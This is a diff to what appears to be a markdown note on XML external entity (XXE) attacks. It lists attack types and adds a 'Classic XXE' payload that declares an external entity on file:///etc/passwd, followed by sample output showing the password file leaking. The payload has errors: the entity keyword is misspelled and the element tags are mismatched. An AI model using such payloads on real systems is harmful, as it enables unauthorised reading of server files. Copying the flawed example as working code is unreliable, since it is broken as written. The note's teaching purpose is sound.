@@ -75,12 +75,28 @@ Online MAP editors using KML
 
 ## ATTACK TYPE 
 
-1. Classic  XXE
+1. Classic XXE
 2. Server Side Request Forgery
 3. Denial of Service 
 4. Advanced XXE 
 5. Remote Code Execution
 
+##  Classic XXE
+
+    <?xml version="1.0" encoding="UTF-8"?>
+    <!DOCTYPE foo [<!ENTTITY asif SYSTEM "file:///etc/passwd"> ]>
+    <userInfo>
+    <FirstName>Khan</firstName>
+    <lastName>&asif;</lastName>
+    </userInfo>
+    
+ ## OUTPUT 
+ Hello Khan root:x:0:0:root....
+ .......
+ ''''''
+ 
+This is Vulnerability
+    
 
 
 
